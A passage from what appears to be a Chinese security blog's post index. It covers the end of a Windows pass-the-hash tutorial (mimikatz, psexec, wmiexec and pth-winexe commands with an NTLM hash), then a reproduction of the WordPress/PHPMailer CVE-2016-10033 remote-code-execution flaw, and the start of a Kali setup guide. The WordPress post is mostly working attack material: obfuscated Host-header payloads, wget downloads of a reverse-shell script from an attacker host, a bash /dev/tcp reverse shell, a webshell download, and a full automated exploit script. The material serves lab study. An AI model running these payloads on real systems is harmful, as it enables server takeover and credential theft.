AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF\n\n举例：\n\nMimikatz先抓取hash\nmimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords&quot;&quot;\n\n得到hash之后：\nsekurlsa::pth /user:Administrator /domain:ssooking-pc /ntlm:AFC44EE7351D61D00698796DA06B1EBFpsexec.exe /accepteula \\\\192.168.1.1 cmd.exe# RDPREG ADD &quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /fprivilege::debugsekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the user&#x27;s ntlm hash&gt; /run:&quot;mstsc.exe /restrictedadmin&quot;\n\nwmiexec.pyexe 版本下载链接\nwindows 管理规范WMI，实际上就是windows从03/XP开始就内置了这个系统插件。其设计初衷之一是为了管理员能更加方便的对远程windows主机进行各种日常管理。严格来说它其实是为各种服务提供一个统一的调用接口，比如你想操作什么服务就去调用对应的服务类中的方法去执行你的操作。在渗透测试中，它意味着我们可以直接在本地操作远程目标机器上的进程、服务、注册表等包括其它一系列特权操作，wmi是一把在目标内网进行横向移动的非常趁手的武器。wmiexec是一个python2脚本，对windows自带的wmic做了一些强化，让渗透变得更容易。只能说很多工具吧，比较好用的在这里介绍两种：\nwmiexec的注释中提示”Main advantage here is it runs under the user (has to be Admin) account”，经实际测试普通用户权限即可。wmiexec的hash参数格式为LMHASH:NTHASH，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值。\nwmiexec.py -hashes 00000000000000000000000000000000:AFC44EE7351D61D00698796DA06B1EBF ssookinging-pc/administrator@17.10.0.10 &quot;whoami&quot;\n\n\nPowershellInvoke-TheHash\nInvoke-WMIExec\nInvoke-WMIExec -Target 17.10.0.10 -Domain test.local -Username test1 -Hash AFC44EE7351D61D00698796DA06B1EBF -Command &quot;calc.exe&quot; -verbose\n\nPTH-EXECkali中自带的横向移动pth的工具，pth-winexe就是其中一个，还有与其类似的：\npth-winexe -U workgroup/administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.10 cmd.exepth-winexe -U administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.11 cmd.exe\n\n\n五、防御思路检测和防御方案参考：https://attack.stealthbits.com/pass-the-hash-attack-explained\n参考链接\n\nMicrosoft NTLM\nhttp://www.cnblogs.com/xwdreamer/archive/2012/08/23/2652541.html\nhttps://www.freebuf.com/articles/database/70395.html\nhttps://blog.csdn.net/qq_27446553/article/details/73635108\n工作组和域的区别\n彻底理解Windows认证\nWindows安全认证是如何进行的？[NTLM篇]\nWindows下的身份验证—-NTLM和Kerberos\n域渗透之横向移动\nhttps://blog.csdn.net/pyphrb/article/details/52051321\nWindows下的密码hash-NTLM-hash和Net-NTLM-hash介绍\n渗透技巧-利用netsh抓取连接文件服务器的NTLMv2-Hash\nhttps://blog.csdn.net/Fly_hps/article/details/80641938\nhttps://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html\nhttps://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html\nhttps://attack.stealthbits.com/pass-the-hash-attack-explained\n\n","categories":["攻防渗透"],"tags":["内网渗透","域渗透","NTML-Hash"]},{"title":"WordPress <= 4.6 命令执行漏洞(PHPMailer)复现分析","url":"/2018/04/wordpress-4-6-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-phpmailer-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/","content":"漏洞信息WordPress 是一种使用 PHP 语言开发的博客平台，用户可以在支持 PHP 和 MySQL 数据库的服务器上架设属于自己的网站。也可以把 WordPress 当作一个内容管理系统（CMS）来使用。WordPress 使用 PHPMailer 组件向用户发送邮件。PHPMailer(版本 &lt; 5.2.18)存在远程命令执行漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。\n漏洞编号CVE-2016-10033\n影响版本WordPress &lt;&#x3D; 4.7.1    PHPMailer &lt; 5.2.18\n测试环境\n拉取镜像到本地\n\n$ docker pull medicean/vulapps:w_wordpress_6\n\n\n启动环境\n\n$ docker run -d -p 8000:80 medicean/vulapps:w_wordpress_6 \n\n\n-p 8000:80 前面的 8000 代表物理机的端口，可随意指定。\n\n访问 http://127.0.0.1:8000 看到 WordPress 主界面代表启动成功\n漏洞分析漏洞页面：/wp-login.php?action=lostpassword\n\n此处是管理员重置密码页面，wordpress使用phpmailer组件进行重置密码邮件的发送，但是phpmailer &lt; 5.2.18之前的版本存在命令注入漏洞，具体你可以先阅读分析文章链接 。\n我们来看看这个漏洞在wordpress中的情况。漏洞文件是class.phpmailer.php，我们在wordpress中搜索查看这个文件，该文件在在wp-includes目录下。我们可以发现几行关键代码：\n/**     * Which method to use to send mail.     * Options: &quot;mail&quot;, &quot;sendmail&quot;, or &quot;smtp&quot;.     * @var string     */    public $Mailer = &#x27;mail&#x27;;    /**     * The path to the sendmail program.     * @var string     */    public $Sendmail = &#x27;/usr/sbin/sendmail&#x27;;\n\n我们发现，实际上phpmailer组件是调用linux系统命令sendmail进行邮件发送，命令格式为：sendmail -t -i -fusername@hostname。并且我们继续审计代码发现：\n/** * Get the server hostname. * Returns &#x27;localhost.localdomain&#x27; if unknown. * @access protected * @return string */protected function serverHostname()&#123;    $result = &#x27;localhost.localdomain&#x27;;    if (!empty($this-&gt;Hostname)) &#123;        $result = $this-&gt;Hostname;    &#125; elseif (isset($_SERVER) and array_key_exists(&#x27;SERVER_NAME&#x27;, $_SERVER) and !empty($_SERVER[&#x27;SERVER_NAME&#x27;])) &#123;        $result = $_SERVER[&#x27;SERVER_NAME&#x27;];    &#125; elseif (function_exists(&#x27;gethostname&#x27;) &amp;&amp; gethostname() !== false) &#123;        $result = gethostname();    &#125; elseif (php_uname(&#x27;n&#x27;) !== false) &#123;        $result = php_uname(&#x27;n&#x27;);    &#125;    return $result;&#125;\n\nserverHostname函数通过传入的SERVER_NAME参数来获取主机名，该主机名即HTTP请求报文中的host值，但是SERVER_NAME参数并没有经过任何过滤，因此我们可以进行任意构造拼接，从而产生了系统命令注入漏洞。\n更棒的是，sendmail 提供了-O和-X 参数，-X参数用于写入日志文件， 我们可以使用-OQueueDirectory=/tmp/ -X/tmp/smtp.php命令组合，它会将发送的邮件保存到/tmp/smtp.php中， 那么在请求的时候payload应该类似于这样：\nPOST /wordpress/wp-login.php?action=lostpassword HTTP/1.1Host: aaa( -X/tmp/smtp.php )@qq.com\n\n在@前面，如果加上括号，将可以引入空格，这样就可以拼接到了sendmail命令中并且保存了测试邮件文件。那么如果我们写入的是Webshell后门文件呢？\n思路很好，然而现实很无奈。\n\nwordpress方面以及PHPMailer库方面都会防止攻击者注入空字符（空格或TAB）到sendmail命令中。并且，添加括号引入向sendmail中注入参数的方法已经行不通了，具体可以参考链接。\n比如我们想要调用/bin/touch的时候也会出问题，因为host字段中如果出现/，服务器会拒绝我们的请求。\n\n因此上述的Sendmail技术在这种情况下不起作用，这条路走不通了！\n正感觉走投无路的时候，这时候我们不妨喝杯茶冷静一下，为什么sendmail能够产生命令注入漏洞呢？我们去了解一下sendmail。然后就会发现柳暗花明又一村了。我们可以知道ubuntu/debain系统中，已经使用exim4替代了sendmail的功能，我们查看sendmail文件可以发现它是一个链向exim4的软链接文件。\n\n那么我们可以利用exim4的语法参数进行命令执行参数的拼接啊！我们查看exim4的帮助手册，可以发现-be参数\nRun Exim in expansion testing mode. Exim  discards  its  root                 privilege,  to prevent ordinary users from using this mode to                 read otherwise inaccessible files. If no arguments are given,                 Exim  runs interactively, prompting for lines of data. Other‐                 wise, it processes each argument in turn.                 If Exim was built with USE_READLINE=yes in Local/Makefile, it                 tries  to  load  the libreadline library dynamically whenever                 the -be option is used without  command  line  arguments.  If                 successful,  it  uses the readline() function, which provides                 extensive line-editing facilities, for reading the test data.                 A line history is supported.                 Long expansion expressions can be split over several lines by                 using backslash continuations. As in Exim&#x27;s run time configu‐                 ration,  white  space  at  the start of continuation lines is                 ignored. Each argument or data line  is  passed  through  the                 string  expansion  mechanism, and the result is output. Vari‐                 able values from the configuration file (for example,  $qual‐                 ify_domain)  are  available,  but  no message-specific values                 (such as $message_exim_id) are set,  because  no  message  is                 being processed (but see -bem and -Mset).                 Note:  If  you  use  this  mechanism to test lookups, and you                 change the data files or databases you are  using,  you  must                 exit  and  restart  Exim before trying the same lookup again.                 Otherwise, because each Exim process caches  the  results  of                 lookups,  you will just get the same result as before.  Macro                 processing is done  on  lines  before  string-expansion:  new                 macros  can  be defined and macros will be expanded.  Because                 macros in the config file are often used for  secrets,  those                 are only available to admin users.\n\n简单来说，-be参数是一个字符串拓展测试命令，它可以读取一些变量的数据。比如，$tod_log，它可以显示系统时间。\n~$ sendmail -be &#x27;$tod_log&#x27;2018-04-20 16:26:47\n\n并且，exim4提供了一些函数用来执行一些命令，如字符串截取函数substr、$run系统调用函数。\n我们可以截取空格字符。如图所示，substr函数从第十个字符开始截取，共截取一个字符，也就是时间字符串的第11个字符，是空格字符。\n\n那么同理，我们也可以截取/字符串：\n\n我们测试使用$run函数调用系统命令\n\n到这里，遇到的问题都解决了，我们于是可以构造payload如下，该payload在&#x2F;tmp&#x2F;目录下创建test.txt文件：\naa(any -froot@localhost -be $&#123;run&#123;/bin/touch /tmp/test.txt&#125;&#125; null)\n\n\n空格  &#x3D;&#x3D;&gt; ${substr{10}{1}{$tod_log}}\n&#x2F;  &#x3D;&#x3D;&gt; ${substr{0}{1}{$spool_directory}}\n\n转换过来就是\naa(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;touch$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;test.txt&#125;&#125; null)\n\n\n\n\n\n我们去密码重置页面输入重置用户名为admin，提交之后拦截请求，并把host的值修改为我们的payload：\nPOST /wp-login.php?action=lostpassword HTTP/1.1Host: aa(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;touch$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;test.txt&#125;&#125; null)User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://172.16.176.128:8000/wp-login.php?action=lostpasswordCookie: wordpress_test_cookie=WP+Cookie+checkDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 63user_login=admin&amp;redirect_to=&amp;wp-submit=Get+New+Password\n\n提交请求：\n\n在&#x2F;tmp目录下发现成功生成了测试文件。\n\n执行任意命令实际上我们按照刚才的思路，替换我们想要执行的命令即可。但实际利用起来，还是有些需要注意的地方：\n\n执行的命令不能包含大量特殊字符，如 : 、引号等。\n命令会被转换成小写字母\n命令需要使用绝对路径\n需要知道某一个存在的用户的用户名\n\n写入shell反弹shell思路是利用curl或者wget命令下载远程文件。这里我测试下载执行一个反弹bash脚本。需要注意的地方：\n\n远程 URL 中不能有 http://\n\n所有字母必须小写\n\n\n远程反弹shell脚本：172.16.176.1:8080/a.txt，内容：\nnohup bash -i &gt;/dev/tcp/172.16.176.1/1337 0&lt;&amp;1 2&gt;&amp;1) &amp;\n\n\n\npayload：\naa(any -froot@localhost -be $&#123;run&#123;/usr/bin/wget --output-document /tmp/rce 172.16.176.1/a.txt&#125;&#125; null)\n\n执行反弹shell：\naa(any -froot@localhost -be $&#123;run&#123;/bin/bash /tmp/rce&#125;&#125; null)\n\n\n\n两个payload转换过来就是\naa(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;usr$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;wget$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;--output-document$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;rce$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;172.16.176.1$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;a.txt&#125;&#125; null)aa(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bash$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;rce&#125;&#125; null)\n\n\n\n在反弹主机上用nc监听1337端口，分别按顺序提交payload即可获取到反弹shell\nnc -nvv -l -p 1337\n\n\n写入一句话webshell同理，可以直接下载一句话webshell，然后菜刀连接。payload：\npayload：\naa(any -froot@localhost -be $&#123;run&#123;/usr/bin/wget --output-document a.php 172.16.176.1/a.txt&#125;&#125; null)\n\n转换过来即\naa(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;usr$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;wget$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;--output-document$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;a.php$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;172.16.176.1$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;a.txt&#125;&#125; null)\n\n\n\nPOC自动化提交payload，获取反弹shell。通过python -mSimpleHTTPServer 80 建立web服务，用于目标下载shell。运行是需要用管理员权限，因为监听了80端口。\n使用方法\nsudo ./wordpress-rce-exploit.sh http://172.16.176.128:8000\n\n\n\n#!/bin/bash##      __                     __   __  __           __#     / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________#    / /   / _ \\/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \\/ ___/ ___/#   / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,&lt; /  __/ /  (__  )#  /_____/\\___/\\__, /\\__,_/_/  /_/ /_/\\__,_/\\___/_/|_|\\___/_/  /____/#            /____/### WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit# CVE-2016-10033## wordpress-rce-exploit.sh (ver. 1.0)### Discovered and coded by## Dawid Golunski (@dawid_golunski)# https://legalhackers.com## ExploitBox project:# https://ExploitBox.io## Full advisory URL:# https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html## Exploit src URL:# https://exploitbox.io/exploit/wordpress-rce-exploit.sh### Tested on WordPress 4.6:# https://github.com/WordPress/WordPress/archive/4.6.zip## Usage:# ./wordpress-rce-exploit.sh target-wordpress-url### Disclaimer:# For testing purposes only### -----------------------------------------------------------------## Interested in vulns/exploitation?###                        .;lc&#x27;#                    .,cdkkOOOko;.#                 .,lxxkkkkOOOO000Ol&#x27;#             .&#x27;:oxxxxxkkkkOOOO0000KK0x:&#x27;#          .;ldxxxxxxxxkxl,.&#x27;lk0000KKKXXXKd;.#       &#x27;:oxxxxxxxxxxo;.       .:oOKKKXXXNNNNOl.#      &#x27;&#x27;;ldxxxxxdc,.              ,oOXXXNNNXd;,.#     .ddc;,,:c;.         ,c:         .cxxc:;:ox:#     .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:#     .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:#     .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:#     .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:#     .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:#     .dxxxxxc      .cNMMMN.oMMMMx&#x27;      .xxxxxx:#     .dxxxxxc     lKo;dNMN.oMM0;:Ok.    &#x27;xxxxxx:#     .dxxxxxc    ;Mc   .lx.:o,    Kl    &#x27;xxxxxx:#     .dxxxxxdl;. .,               .. .;cdxxxxxx:#     .dxxxxxxxxxdc,.              &#x27;cdkkxxxxxxxx:#      .&#x27;:oxxxxxxxxxdl;.       .;lxkkkkkxxxxdc,.#          .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.#             .&#x27;:oxxxxxxxxx.ckkkkkkkkxl,.#                 .,cdxxxxx.ckkkkkxc.#                    .&#x27;:odx.ckxl,.#                        .,.&#x27;.## https://ExploitBox.io## https://twitter.com/Exploit_Box## -----------------------------------------------------------------rev_host=&quot;172.16.176.1&quot;function prep_host_header() &#123;      cmd=&quot;$1&quot;      rce_cmd=&quot;\\$&#123;run&#123;$cmd&#125;&#125;&quot;;      # replace / with $&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;      #sed &#x27;s^/^$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;^g&#x27;      rce_cmd=&quot;`echo $rce_cmd | sed &#x27;s^/^\\$&#123;substr&#123;0&#125;&#123;1&#125;&#123;\\$spool_directory&#125;&#125;^g&#x27;`&quot;      # replace &#x27; &#x27; (space) with      #sed &#x27;s^ ^$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$^g&#x27;      rce_cmd=&quot;`echo $rce_cmd | sed &#x27;s^ ^\\$&#123;substr&#123;10&#125;&#123;1&#125;&#123;\\$tod_log&#125;&#125;^g&#x27;`&quot;      #return &quot;target(any -froot@localhost -be $rce_cmd null)&quot;      host_header=&quot;target(any -froot@localhost -be $rce_cmd null)&quot;      return 0&#125;#cat exploitbox.ansintro=&quot;DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09rbzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19fG1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19cG1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAgIHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19fIC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19fX19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtbNUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01NTU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTszNG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcbWzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2ROTU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMgICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQobWzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1szNG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtbMzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19fX19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K&quot;intro2=&quot;ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtbMG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBEaXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAgICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJpbGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg==&quot;echo &quot;$intro&quot;  | base64 -decho &quot;$intro2&quot; | base64 -dif [ &quot;$#&quot; -ne 1 ]; thenecho -e &quot;Usage:\\n$0 target-wordpress-url\\n&quot;exit 1fitarget=&quot;$1&quot;echo -ne &quot;\\e[91m[*]\\033[0m&quot;read -p &quot; Sure you want to get a shell on the target &#x27;$target&#x27; ? [y/N] &quot; choiceechoif [ &quot;$choice&quot; == &quot;y&quot; ]; thenecho -e &quot;\\e[92m[*]\\033[0m Guess I can&#x27;t argue with that... Let&#x27;s get started...\\n&quot;echo -e &quot;\\e[92m[+]\\033[0m Connected to the target&quot;# Serve payload/bash script on :80RCE_exec_cmd=&quot;(sleep 3s &amp;&amp; nohup bash -i &gt;/dev/tcp/$rev_host/1337 0&lt;&amp;1 2&gt;&amp;1) &amp;&quot;echo &quot;$RCE_exec_cmd&quot; &gt; rce.txtpython -mSimpleHTTPServer 80 2&gt;/dev/null &gt;&amp;2 &amp;hpid=$!# Save payload on the target in /tmp/rcecmd=&quot;/usr/bin/curl -o/tmp/rce $rev_host/rce.txt&quot;prep_host_header &quot;$cmd&quot;curl -H&quot;Host: $host_header&quot; -s -d &#x27;user_login=admin&amp;wp-submit=Get+New+Password&#x27; $target/wp-login.php?action=lostpasswordecho -e &quot;\\n\\e[92m[+]\\e[0m Payload sent successfully&quot;# Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rcecmd=&quot;/bin/bash /tmp/rce&quot;prep_host_header &quot;$cmd&quot;curl -H&quot;Host: $host_header&quot; -d &#x27;user_login=admin&amp;wp-submit=Get+New+Password&#x27; $target/wp-login.php?action=lostpassword &amp;echo -e &quot;\\n\\e[92m[+]\\033[0m Payload executed!&quot;echo -e &quot;\\n\\e[92m[*]\\033[0m Waiting for the target to send us a \\e[94mreverse shell\\e[0m...\\n&quot;nc -nvv -l -p 1337echoelseecho -e &quot;\\e[92m[+]\\033[0m Responsible choice ;) Exiting.\\n&quot;exit 0fiecho &quot;Exiting...&quot;exit 0\n\n\n\n修复建议更新wordpress、phpmailer到最新版本\n参考链接https://paper.seebug.org/161/\nhttp://bobao.360.cn/news/detail/4146.html\nhttp://vulapps.evalbug.com/w_wordpress_6/\nhttps://github.com/opsxcq/exploit-CVE-2016-10033\nhttps://github.com/vulhub/vulhub/tree/master/wordpress/pwnscriptum\n","categories":["漏洞分析","Web安全"],"tags":["WordPress"]},{"title":"kali常用配置总结","url":"/2018/11/kali%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE%E6%80%BB%E7%BB%93/","content":"添加普通用户\nuseradd -m -G sudo,video,audio,cdrom -s /bin/bash ssooking\n\n把某个用户添加到组中: sudo usermod -a 用户名 -G 组名递归更改目录&#x2F;文件所属用户组： sudo chgrp 用户名 -R MyDocuments/递归更改目录&#x2F;文件拥有者： sudo chown  用户名 -R MyDocuments/\n一、更新升级1.添加源：vi /etc/apt/sources.list，比较好用的kali源\ndeb http://http.kali.org/kali kali-rolling main non-free contribdeb http://mirrors.aliyun.com/debian stable main contrib non-freedeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n\n如果是其他系统导入kali源，比如ubuntu，需要导入kali公钥\napt-key adv --keyserver pgp.mit.edu --recv-keys ED444FF07D8D0BF6wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add\n\n2.更新软件列表并更新软件apt-get update &amp; apt-get upgrade -y\n\n3.升级操作系统apt-get dist-upgrade -y\n\n 如果软件包更新过程中临时中断，可以使用修复命令：\ndpkg --configure -a\n\n4.安装内核头文件apt-get install linux-headers-$( uname -r )\n\n清理系统软件包和内核：\nuname –r 查看正在使用的内核dpkg --get-selections | grep linux\n\n删除不用的内核文件image、头文件headers：\napt-get purge 内核文件名 头文件名 \n\n5.清理系统apt-get clean &amp;&amp; apt-get autoclean &amp;&amp; apt-get autoremove -y　　\n\n详解：\napt-get remove 软件名 　　#删除相应的软件,但保留配置文件apt-get purge 软件名 　　 #同时清除软件包和软件的配置文件apt-get clean 　　　　　　#删除软件包缓存（/var/cache/apt/archives）apt-get autoremove 　　　#自动清理无用的依赖包\n\n清理系统残存配置:\ndpkg -l |grep ^rc|awk &#x27;&#123;print $2&#125;&#x27; |sudo xargs dpkg -P\n\n二、安装常用工具谷歌拼音apt-get install fcitx fcitx-googlepinyin\n\n安装完毕后重启生效，打开Fcitx Configuration \n点左下角那个“+” ，–&gt; 去掉”仅显示当前语言”的勾 –&gt; 找到“googlepinyin”并添加。默认使用ctrl+空格切换中英文输入法\n截图工具flameshotapt-get install flameshotflameshot config\t#配置flameshotflameshot gui\t\t#截图\n\n去掉最后几项，这样截图界面会清爽很多。\n\n在系统设置—Keyboard设置中添加快捷键\n\n使用Ctrl+Alt+A快捷键截图试试\n\n增加vpn支持sudo apt-get install pptpd network-manager-openvpn network-manager-openvpn-gnome network-manager-pptp network-manager-pptp-gnome network-manager-strongswan network-manager-vpnc network-manager-vpnc-gnome\n\n安装oh-my-zshapt-get install zshsh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;2chsh -s /bin/zsh\n\n使用蓝牙apt-get install pi-bluetooth bluez bluez-firmware blueman\n\n关键一点：添加pi用户到蓝牙组\nusermod -G bluetooth -a piusermod -G bluetooth -a 用户名\n\n一些必备工具下面介绍一些**非常好用**的工具，apt可以直接安装\n\npeek：GIF录制\n\ncatfish 